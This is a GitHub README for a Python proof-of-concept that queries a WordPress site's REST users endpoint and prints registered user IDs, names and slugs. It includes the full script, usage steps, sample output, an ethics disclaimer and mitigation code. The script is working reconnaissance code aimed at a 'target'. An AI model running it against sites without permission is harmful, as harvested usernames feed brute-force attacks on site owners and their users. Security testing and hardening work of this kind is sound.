A Proof-of-Concept Python script to detect and demonstrate WordPress user enumeration vulnerability via the REST API.
🚨 Description

This tool identifies WordPress sites that expose user information through the publicly accessible REST API endpoint /wp-json/wp/v2/users. This vulnerability allows attackers to enumerate all registered users, which is often the first step in targeted brute-force attacks.
⚡ Quick Start
Prerequisites

    Python 3.x

    requests library

Installation
bash

# Clone the repository
git clone https://github.com/Maimoharris/wordpress-user-enumeration-poc.git
cd wordpress-user-enumeration-poc

# Install dependencies
pip install requests

Basic Usage

    Edit the target URL in the script:

python

web_site = "https://yourtarget.com/"  # Change this to your target

    Run the script:

bash

python wordpress_user_enum.py

Advanced Usage (Command Line Arguments)

Modify the script to accept dynamic targets:
python

import sys

if len(sys.argv) > 1:
    web_site = sys.argv[1]
else:
    web_site = "https://default-target.com/"

🎯 Features

    ✅ Detects WordPress user enumeration vulnerability

    ✅ Extracts user IDs, names, and slugs

    ✅ Simple and lightweight

    ✅ No complex dependencies

    ✅ Clear vulnerability assessment

📋 Output Example
Vulnerable Site
text

Website is Vulnerable to User Enumeration!
User ID: 1
User Name: admin
User Slug: admin

User ID: 2
User Name: John Smith
User Slug: jsmith

User ID: 3
User Name: Sarah Connor
User Slug: sconnor

Secure Site
text

Website is NOT Vulnerable

🔧 Script Code
python

# WordPress User Enumeration PoC Script
# Author: Maimo Harris
import json
import requests

web_site = "https://www.targetsite.com/"
endpoint = "/wp-json/wp/v2/users"
url = f"{web_site}{endpoint}"

response = requests.get(url)
if response.status_code == 200:
    print("Website is Vulnerable to User Enumeration!")
    json_data = response.json()
    for users in json_data:
        print(f"User ID: {users['id']}")
        print(f"User Name: {users['name']}")
        print(f"User Slug: {users['slug']}\n")
else:
    print("Website is NOT Vulnerable")

🛡️ Use Cases

    Penetration Testing: Identify user enumeration vulnerabilities

    Security Auditing: Check your own WordPress installations

    Bug Bounty Hunting: Find low-hanging fruit in target scope

    Educational Purposes: Learn about WordPress security issues

    Red Team Exercises: Information gathering phase

⚠️ Legal & Ethical Usage

THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY

    ✅ Test on websites you own

    ✅ Use with explicit permission from the target owner

    ✅ Educational and research purposes

    ✅ Authorized penetration testing

    ❌ Do not use on websites without permission

    ❌ Do not use for malicious purposes

    ❌ Do not violate laws or regulations

The author is not responsible for any misuse of this tool.
🔒 Mitigation
For WordPress Administrators

1. Code Fix (Recommended)
Add to your theme's functions.php:
php

function disable_rest_api_user_enum() {
    if (!is_user_logged_in()) {
        wp_die('Unauthorized access', 401);
    }
}
add_action('rest_api_init', 'disable_rest_api_user_enum', 1);

2. Security Plugins

    Wordfence Security

    All In One WP Security & Firewall

    Disable WP REST API

3. Web Server Configuration
Block access to /wp-json/wp/v2/users via .htaccess (Apache) or nginx config.
📖 Technical Details

Vulnerability: Information Disclosure
CVSS Score: 5.3 (Medium)
Attack Vector: Network
Required Privileges: None
User Interaction: None

Impact:

    User enumeration leads to targeted attacks

    Increased success rate for brute-force attacks

    Privacy violation for registered users

🤝 Contributing

Contributions are welcome! Please feel free to submit pull requests or open issues for:

    Bug fixes

    Feature enhancements

    Documentation improvements

    Additional detection methods

📞 Contact

Author: Maimo Harris
Email: maimoharris111@gmail.com
LinkedIn: Maimo Harris
Blog: https://maimoharris.onrender.com
GitHub: @Maimoharris
📄 License

This project is licensed under the MIT License - see the LICENSE file for details.
⭐ Support

If you find this tool useful, please give it a star ⭐ on GitHub!

Remember: Always practice ethical hacking and obtain proper authorization before testing any system. 🔐
